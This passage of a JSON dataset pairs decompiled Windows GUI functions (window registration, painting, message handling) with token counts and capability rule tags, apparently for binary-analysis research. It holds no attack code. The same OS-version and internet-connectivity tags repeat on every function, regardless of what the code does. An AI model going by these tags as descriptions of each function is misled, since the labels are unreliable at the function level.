   puStack28 = 0x461ed3;\n    uStack32 = 0x461ecb;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 420
    },
    "0046253c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046253c(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    (**(**(arg_8h + -0xc) + 8))();\n    if (((*(arg_8h + -0x10) != 0) &&\n        (((in_AL == '\\0' || (*(*(arg_8h + -0x10) + 0x57) != '\\0')) ||\n         (((*(*(arg_8h + -0x10) + 0x1c) & 0x10) != 0 && ((*(*(arg_8h + -0x10) + 0x51) & 4) == 0)))))) &&\n       (in_AL == *(*(arg_8h + -0x10) + 0x5b))) {\n        fcn.004194b8();\n    }\n    var_8h = fcn.00462d98();\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = fcn.00462d5c();\n            if (((in_AL == *(iVar2 + 0x5b)) &&\n                (((((in_AL == '\\0' || (*(iVar2 + 0x57) != '\\0')) || (*0x4626c4 == (*0x4626c4 & *(iVar2 + 0x50)))) ||\n                  (((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)))) &&\n                 ((cVar1 = fcn.004047cc(),  cVar1 == '\\0' || ((*(iVar2 + 0x1c) & 0x10) == 0)))))) &&\n               (iVar2 != *(arg_8h + -0x10))) {\n                for (iVar2 = 0; iVar2 < *(*(arg_8h + -0xc) + 8); iVar2 = iVar2 + 1) {\n                    arg_8h_00 = arg_8h;\n                    fcn.00419610();\n                    cVar1 = fcn.004623c4(arg_8h_00);\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.0041968c();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    var_8h = *(*(arg_8h + -0xc) + 8);\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = arg_8h;\n            fcn.00419610();\n            fcn.004624f4(iVar2);\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 694
    },
    "004626c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004626c8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00462d98();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00462d5c();\n            if (*(iVar2 + 0x5b) != '\\0') {\n                return 1;\n            }\n            iVar2 = fcn.00462d5c();\n            if (*0x462718 != *(iVar2 + 0x61)) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 170
    },
    "0046271c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046271c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x77) != '\\0') && (*(in_EAX + 0x1db) != '\\0')) && (in_EAX[0x6c] != 0)) {\n        (**(*in_EAX[0x6c] + 0x2c))();\n    }\n    uStack32 = 0x462766;\n    cVar1 = fcn.004626c8(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x90))();\n        fcn.00404610();\n        uStack32 = 0x4627fb;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        fcn.0046253c(&stack0xfffffffc);\n        fcn.0046253c(&stack0xfffffffc);\n        fcn.0046253c(&stack0xfffffffc);\n        fcn.0046253c(&stack0xfffffffc);\n        fcn.0046253c(&stack0xfffffffc);\n        fcn.0046253c(&stack0xfffffffc);\n        fcn.0046253c(&stack0xfffffffc);\n        fcn.0040483c();\n        *in_FS_OFFSET = uStack36;\n        uStack32 = 0x4627fa;\n        fcn.00404640();\n        return;\n    }\n    if (*(in_EAX + 0x1da) != '\\0') {\n        fcn.0040483c();\n    }\n    return;\n}\n",
        "token_count": 414
    },
    "00462820": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00462820(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_4h;\n    \n    puStack32 = 0x462834;\n    cVar1 = fcn.00466fb4();\n    if ((cVar1 != '\\0') && ((*(in_EAX + 7) & 8) == 0)) {\n        if (*(in_EAX + 100) == 0) {\n            puStack32 = 0x462860;\n            fcn.004628b4();\n            uStack36 = 0x4628a7;\n            uStack40 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd8;\n            puStack32 = &stack0xfffffffc;\n            (**(*in_EAX + 0x44))();\n            (**(*in_EAX + 0x94))();\n            *in_FS_OFFSET = uStack40;\n            puStack32 = 0x4628ae;\n            *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n            uStack36 = 0x4628a6;\n            fcn.004628bc();\n            return;\n        }\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) | 0x10;\n    }\n    return;\n}\n",
        "token_count": 338
    },
    "004628bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004628bc(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 400) = *(in_EAX + 400) + -1;\n    if ((*(in_EAX + 400) == 0) && ((*(in_EAX + 0x54) & 0x10) != 0)) {\n        fcn.004628dc();\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "00462db8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462db8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00462d98();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00462d5c();\n            (**(iVar2 + 0x38))();\n            if (*(param_2 + 0xc) != 0) {\n                return;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00462fe4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00462fe4(void)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint *arg_ch;\n    uint uStack216;\n    uint uStack212;\n    uchar *puStack208;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint lpWndClass;\n    code *var_b0h;\n    uint var_8ch;\n    uint var_85h;\n    int32_t var_70h;\n    uint var_68h;\n    code *var_64h;\n    uint hInstance;\n    uint *var_44h;\n    uint lpClassName;\n    \n    puStack208 = &stack0xfffffffc;\n    uStack212 = 0x4631a5;\n    uStack216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack216;\n    (**(*in_EAX + 0x9c))();\n    if ((var_70h == 0) && ((var_85h & 0x40) != 0)) {\n        if ((in_EAX[1] != 0) && ((*(in_EAX[1] + 0x1c) & 2) != 0)) {\n            cVar1 = fcn.004047cc();\n            if (cVar1 != '\\0') {\n                var_70h = fcn.00466ca8();\n                goto code_r0x00463090;\n            }\n        }\n        var_bch = in_EAX[2];\n        var_b8h._0_1_ = 0xb;\n        arg_ch = &var_bch;\n        uVar5 = 0;\n        fcn.00407480();\n        fcn.0040da34(uVar5, arg_ch);\n        fcn.00404eb4();\n    }\ncode_r0x00463090:\n    in_EAX[0x6a] = var_64h;\n    iVar3 = sub.user32.dll_GetClassInfoA(hInstance, &lpClassName, &lpWndClass);\n    if ((iVar3 == 0) || (var_b0h != fcn.0045b860)) {\n        if (iVar3 != 0) {\n            sub.user32.dll_UnregisterClassA(&lpClassName, hInstance);\n        }\n        var_64h = fcn.0045b860;\n        var_44h = &lpClassName;\n        iVar2 = sub.user32.dll_RegisterClassA(&var_68h);\n        if (iVar2 == 0) {\n            fcn.0040f168();\n        }\n    }\n    *0x4a4790 = in_EAX;\n    (**(*in_EAX + 0xa0))();\n    if (in_EAX[0x6d] == 0) {\n        fcn.0040f168();\n    }\n    uVar4 = sub.user32.dll_GetWindowLongA(in_EAX[0x6d], 0xfffffff0);\n    if ((uVar4 & 0x40000000) != 0) {\n        iVar3 = sub.user32.dll_GetWindowLongA(in_EAX[0x6d], 0xfffffff4);\n        if (iVar3 == 0) {\n            sub.user32.dll_SetWindowLongA(in_EAX[0x6d], 0xfffffff4, in_EAX[0x6d]);\n        }\n    }\n    fcn.0040aa04();\n    in_EAX[0x19] = 0;\n    fcn.00466fc0();\n    uVar5 = 1;\n    fcn.00427b88();\n    fcn.004601fc(uVar5);\n    if (*(in_EAX + 0x17) != '\\0') {\n        fcn.0040483c();\n    }\n    *in_FS_OFFSET = uVar5;\n    fcn.0040546c(0x4631ac);\n    return;\n}\n",
        "token_count": 899
    },
    "00463294": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00463294(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    if ((*(*(arg_8h + -4) + 0x20) == 0) || (cVar1 = fcn.00463280(),  cVar1 == '\\0')) {\n        iVar3 = *(*(arg_8h + -8) + 0x1cc);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                iVar2 = fcn.00419610();\n                if ((*(iVar2 + 0x5b) == '\\0') && (*0x463370 != *(iVar2 + 0x61))) {\n                    return 1;\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = *(*(arg_8h + -8) + 0x1d0);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                iVar2 = fcn.00419610();\n                if ((*(iVar2 + 0x5b) == '\\0') && (*0x463370 != *(iVar2 + 0x61))) {\n                    return 1;\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 376
    },
    "00463598": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463598(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *arg_8h;\n    uStack16 = arg_8h[1];\n    uStack12 = arg_8h[2];\n    uStack8 = arg_8h[3];\n    if (*(in_EAX + 0x232) != 0) {\n        (**(in_EAX + 0x230))(&var_10h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "0046362c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046362c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    if (in_EAX[0x6d] != 0) {\n        if ((in_EAX[0x74] != 0) && (iVar2 = *(in_EAX[0x74] + 8),  -1 < iVar2 + -1)) {\n            do {\n                piVar1 = fcn.00419610();\n                (**(*piVar1 + 0xb0))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iStack20 = in_EAX[0x6d];\n        uStack16 = (*(in_EAX + 0x55) & 0x20) != 0;\n        sub.user32.dll_EnumChildWindows(iStack20, fcn.004635e8, &iStack20);\n        (**(*in_EAX + 0xb8))();\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "004636a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004636a0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1b4) != 0) {\n        fcn.004601fc(0);\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "00463744": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00463744(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    if ((((*(in_EAX + 0x57) == '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x55) & 8) != 0)))) &&\n        (((*(in_EAX + 7) & 0x10) == 0 || (((*(in_EAX + 0x55) & 8) != 0 || ((*(in_EAX + 0x51) & 4) != 0)))))) ||\n       (((*(in_EAX + 0x15) & 8) != 0 || ((*(in_EAX + 7) & 8) != 0)))) {\n        cVar1 = '\\0';\n    }\n    else {\n        cVar1 = '\\x01';\n    }\n    if (cVar1 != '\\0') {\n        if (in_EAX[0x6d] == 0) {\n            puStack28 = 0x4637be;\n            (**(*in_EAX + 0x98))();\n        }\n        if ((in_EAX[0x74] != 0) && (iVar2 = *(in_EAX[0x74] + 8),  -1 < iVar2 + -1)) {\n            do {\n                puStack28 = 0x4637e6;\n                fcn.00419610();\n                puStack28 = 0x4637eb;\n                fcn.00463744();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    if ((in_EAX[0x6d] != 0) && (*(in_EAX + 0x1da) != cVar1)) {\n        *(in_EAX + 0x1da) = cVar1;\n        uStack32 = 0x463840;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        uVar3 = 0;\n        puStack28 = &stack0xfffffffc;\n        fcn.004601fc(0);\n        *in_FS_OFFSET = uVar3;\n    }\n    return;\n}\n",
        "token_count": 548
    },
    "00463868": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00463868(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = in_EAX;\n    do {\n        iVar1 = *(iVar3 + 0x30);\n        if (iVar1 == 0) {\n            if ((*(in_EAX + 0x1c) & 8) == 0) {\n                cVar2 = fcn.004047cc();\n                if ((cVar2 != '\\0') || (*(iVar3 + 0x1c4) != 0)) {\n                    fcn.00463744();\n                }\n            }\n            return;\n        }\n        iVar3 = iVar1;\n    } while (*(iVar1 + 0x1da) != '\\0');\n    *(in_EAX + 0x1da) = 0;\n    return;\n}\n",
        "token_count": 197
    },
    "004638b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004638b8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_4h;\n    \n    if ((in_EAX[0xc] == 0) && (param_2 != in_EAX[0x71])) {\n        if ((in_EAX[0x6d] == 0) || ((in_EAX[0x71] == 0 || (param_2 == 0)))) {\n            fcn.00468048();\n            uVar1 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            (**(*in_EAX + 0xb0))();\n            in_EAX[0x71] = param_2;\n            fcn.00463868();\n            *in_FS_OFFSET = uVar1;\n            fcn.00468048();\n            return;\n        }\n        in_EAX[0x71] = param_2;\n        sub.user32.dll_SetParent();\n        if ((4 < **0x4a4d30) && (**0x4a5164 == 2)) {\n            fcn.004601fc(0);\n        }\n        fcn.00463868();\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "00463a14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463a14(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    uint lprc;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00418198();\n    *(arg_8h + -0xc) = var_ch;\n    *(arg_8h + -8) = var_8h;\n    (**(*in_EAX + 0x44))(*(arg_8h + -0xc), *(arg_8h + -8));\n    iVar2 = sub.user32.dll_PtInRect(&lprc);\n    if (iVar2 == 0) {\n        bVar3 = false;\n    }\n    else if (((*(in_EAX + 7) & 0x10) == 0) || ((*(in_EAX + 0x57) == '\\0' && ((*(in_EAX + 0x51) & 4) != 0)))) {\n        if (*(in_EAX + 0x57) != '\\0') {\n            cVar1 = (**(*in_EAX + 0x50))();\n            if ((cVar1 != '\\0') || (*(arg_8h + -0xd) != '\\0')) {\n                var_4h = CONCAT22(*(arg_8h + -8), *(arg_8h + -0xc));\n                iVar2 = fcn.004601fc(var_4h);\n                bVar3 = iVar2 != 0;\n                goto code_r0x00463ad0;\n            }\n        }\n        bVar3 = false;\n    }\n    else {\n        bVar3 = true;\n    }\ncode_r0x00463ad0:\n    if (bVar3) {\n        *(arg_8h + -0x14) = in_EAX;\n    }\n    return;\n}\n",
        "token_count": 428
    },
    "00463ae0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00463ae0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint arg_ch_00;\n    uchar *puVar3;\n    uint arg_8h_00;\n    int32_t var_14h;\n    uint var_dh;\n    uint var_4h;\n    \n    var_14h = 0;\n    if (((arg_ch != '\\0') && (*(in_EAX + 0x1d0) != 0)) && (iVar2 = *(*(in_EAX + 0x1d0) + 8) + -1,  -1 < iVar2)) {\n        do {\n            if (arg_8h != '\\0') {\n                arg_ch_00 = 1;\n                arg_8h_00 = 1;\n                fcn.00419610();\n                var_14h = fcn.00463ae0(arg_8h_00, arg_ch_00);\n            }\n            if (var_14h == 0) {\n                puVar3 = &stack0xfffffffc;\n                fcn.00419610();\n                cVar1 = fcn.00463a14(puVar3);\n                if (cVar1 != '\\0') break;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if (((*(in_EAX + 0x1cc) != 0) && (var_14h == 0)) && (iVar2 = *(*(in_EAX + 0x1cc) + 8) + -1,  -1 < iVar2)) {\n        do {\n            puVar3 = &stack0xfffffffc;\n            fcn.00419610();\n            cVar1 = fcn.00463a14(puVar3);\n            if (cVar1 != '\\0') {\n                return 0;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return var_14h;\n}\n",
        "token_count": 462
    },
    "00463cf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00463cf0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.00466ca8();\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar1 == iVar2) {\n        if ((*0x4a4850 == 0) || (iVar1 = *0x4a4850,  in_EAX != *(*0x4a4850 + 0x30))) {\n            iVar1 = 0;\n        }\n    }\n    else {\n        iVar1 = fcn.00463ae0(0, 0);\n    }\n    if (iVar1 != 0) {\n        uVar3 = fcn.004601fc(*(param_2 + 8) - *(iVar1 + 0x40) & 0xffffU | *(param_2 + 10) - *(iVar1 + 0x44) << 0x10);\n        *(param_2 + 0xc) = uVar3;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 259
    },
    "004642c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004642c4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x1b4) == 0) {\n        fcn.004605a8();\n    }\n    else {\n        if ((*param_2 == 0x7b) && (*(in_EAX + 0x30) != 0)) {\n            iVar1 = fcn.004601fc(param_2[2]);\n            param_2[3] = iVar1;\n            if (iVar1 != 0) {\n                return;\n            }\n        }\n        iVar1 = *param_2;\n        if (iVar1 - 0x132U < 7) {\n            iVar1 = sub.user32.dll_SendMessageA(param_2[2], iVar1 + 0xbc00, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 - 0xbd32U < 7) {\n            uVar2 = fcn.0042767c();\n            sub.gdi32.dll_SetTextColor(param_2[1], uVar2);\n            fcn.004283fc();\n            uVar2 = fcn.0042767c();\n            sub.gdi32.dll_SetBkColor(param_2[1], uVar2);\n            iVar1 = fcn.00428438();\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 == *0x4ab004) {\n            param_2[3] = in_EAX;\n        }\n        else {\n            iVar1 = sub.user32.dll_CallWindowProcA(*(in_EAX + 0x1a8), *(in_EAX + 0x1b4), iVar1, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        if (*param_2 == 0xc) {\n            fcn.0045eae0(param_2[2]);\n        }\n    }\n    return;\n}\n",
        "token_count": 472
    },
    "00464400": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464400(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack132;\n    uint uStack128;\n    uchar *puStack124;\n    int32_t iStack120;\n    int32_t iStack116;\n    uint *puStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint var_50h;\n    int32_t hdc;\n    uint nSavedDC;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    hdc = *(param_2 + 4);\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (hdc == 0) {\n        puStack100 = &fcn.00464400::var_50h;\n        uStack104 = 0x46442a;\n        uStack104 = fcn.00466ca8();\n        puStack108 = 0x464430;\n        hdc = sub.user32.dll_BeginPaint();\n    }\n    puStack112 = 0x46455f;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (var_4h[0x73] == 0) {\n        iStack120 = 0x46445b;\n        puStack108 = &stack0xfffffffc;\n        (**(*var_4h + 0xc4))();\n        iStack120 = 0x464536;\n        fcn.00464598();\n        *in_FS_OFFSET = iStack116;\n        puStack108 = 0x464566;\n        if (*(var_8h + 4) == 0) {\n            puStack112 = &fcn.00464400::var_50h;\n            iStack116 = 0x464558;\n            iStack116 = fcn.00466ca8();\n            iStack120 = 0x46455e;\n            sub.user32.dll_EndPaint();\n        }\n        return;\n    }\n    iStack120 = hdc;\n    puStack124 = 0x464469;\n    puStack108 = &stack0xfffffffc;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack128 = 0x464522;\n    iStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar4 = 2;\n    iVar3 = *(var_4h[0x73] + 8);\n    puStack124 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar3 + -1) {\n        do {\n            puStack124 = puVar1;\n            iVar2 = fcn.00419610();\n            if ((((*(iVar2 + 0x57) != '\\0') && (((*(iVar2 + 0x1c) & 0x10) == 0 || ((*(iVar2 + 0x55) & 8) == 0)))) ||\n                (((*(iVar2 + 0x1c) & 0x10) != 0 && (((*(iVar2 + 0x55) & 8) == 0 && ((*(iVar2 + 0x51) & 4) == 0)))))) &&\n               ((*(iVar2 + 0x50) & 0x40) != 0)) {\n                iStack132 = hdc;\n                iVar4 = sub.gdi32.dll_ExcludeClipRect();\n                if (iVar4 == 1) break;\n            }\n            iVar3 = iVar3 + -1;\n            puVar1 = puStack124;\n        } while (iVar3 != 0);\n    }\n    if (iVar4 != 1) {\n        (**(*var_4h + 0xc4))();\n    }\n    *in_FS_OFFSET = iStack132;\n    puStack124 = 0x464529;\n    uStack128 = nSavedDC;\n    iStack132 = hdc;\n    sub.gdi32.dll_RestoreDC();\n    return;\n}\n",
        "token_count": 931
    },
    "00464598": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464598(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint *arg_8h;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint *puStack76;\n    uint lprc;\n    int32_t var_18h;\n    uint nSavedDC;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hDC;\n    int32_t var_4h;\n    \n    hDC = param_2;\n    var_4h = in_EAX;\n    if (((*(in_EAX + 0x1dc) != '\\0') && (*(in_EAX + 0x1db) != '\\0')) && (*(in_EAX + 0x1b0) != 0)) {\n        (**(**(in_EAX + 0x1b0) + 0x20))();\n    }\n    if (*(var_4h + 0x1cc) != 0) {\n        var_ch = 0;\n        if (param_1 != 0) {\n            var_ch = fcn.0041966c();\n            if (var_ch < 0) {\n                var_ch = 0;\n            }\n        }\n        var_10h = *(*(var_4h + 0x1cc) + 8);\n        if (var_ch < var_10h) {\n            do {\n                var_18h = fcn.00419610();\n                if (((*(var_18h + 